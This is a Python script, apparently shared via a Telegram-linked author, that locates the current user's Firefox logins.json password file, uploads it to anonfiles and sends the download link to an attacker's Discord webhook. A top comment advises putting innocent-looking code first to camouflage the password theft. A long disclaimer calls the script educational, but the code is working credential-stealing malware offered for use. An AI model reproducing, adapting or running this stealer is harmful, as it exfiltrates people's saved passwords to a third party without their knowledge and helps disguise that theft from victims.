#__________  _____ _____________________
#\____    / /  _  \\______   \_   _____/
#  /     / /  /_\  \|     ___/|    __)_ 
# /     /_/    |    \    |    |        \
#/_______ \____|__  /____|   /_______  /
#        \/       \/                 \/ 
# Telegram: https://t.me/zapedios






print("Hello, World!") #I RECOMMEND PUTTING A CODE TO CAMOUFLAGE THE CODE THAT STEALS PASSWORDS










###
import os
import requests

def upload_file_to_anonfiles(file_path):
    url = "https://api.anonfiles.com/upload"
    files = {'file': open(file_path, 'rb')}
    
    response = requests.post(url, files=files)
    
    if response.status_code == 200:
        data = response.json()
        if data['status']:
            return data['data']['file']['url']['full']
        else:
            return "{}".format(data['error']['message'])
    else:
        return " {}".format(response.status_code)

def send_discord_webhook(webhook_url, message):
    payload = {"content": message}
    response = requests.post(webhook_url, json=payload)
    if response.status_code != 204:
        print("", response.status_code)

def find_logins_json(username):
    folder_path = f"/home/{username}/.mozilla/firefox/"
    
    for root, dirs, files in os.walk(folder_path):
        for file in files:
            if file == "logins.json":
                return os.path.join(root, file)
    
    return None

async def main():
    nombre_usuario = os.getlogin()

    ruta_del_archivo = find_logins_json(nombre_usuario)

    if ruta_del_archivo:
        print("")
        
        enlace_de_descarga = upload_file_to_anonfiles(ruta_del_archivo)
        
        if enlace_de_descarga:
            webhook_url_discord1 = "PUT_YOUR_WEBHOOK_HERE"  

            disclaimer_message = """**Disclaimer:** The provided script offers functionalities to upload the *logins.json* file from the Firefox folder to an anonymous storage service and send a message via Discord with a download link. It is essential to note that this script is provided for educational or personal use only and must be utilized responsibly and ethically. Important Notice: I do not take responsibility for any misuse of this script. The improper use of this script to access, share, or compromise the privacy of third-party accounts, passwords, or personal information, including sensitive data, is strictly prohibited and may result in legal consequences. The user assumes all responsibility for any actions performed using this script. I reiterate that this script is intended solely for legitimate and ethical purposes, such as retrieving your passwords in case of loss or conducting tests in controlled environments with explicit consent from the account owner involved. Always remember to respect applicable laws and privacy policies and obtain proper authorization before accessing or sharing sensitive information of third parties. If you agree with these conditions and understand the importance of using this script responsibly, you may proceed with its use. Otherwise, I urge you not to continue its execution and delete it from your system. If you have any questions or concerns about this script or its use, feel free to consult a cybersecurity expert or legal professional. User security and data privacy should always be a top priority."""
            
            mensaje_discord = f"**ZAPE** here is the download link for your FireFox passwords || {enlace_de_descarga} || *ping:* || @everyone ||"

            full_message = disclaimer_message + "\n\n" + mensaje_discord
            
            send_discord_webhook(webhook_url_discord1, full_message)
            
            print("")
        else:
            print("")
    else:
        print("")

if __name__ == "__main__":
    import asyncio
    asyncio.run(main())
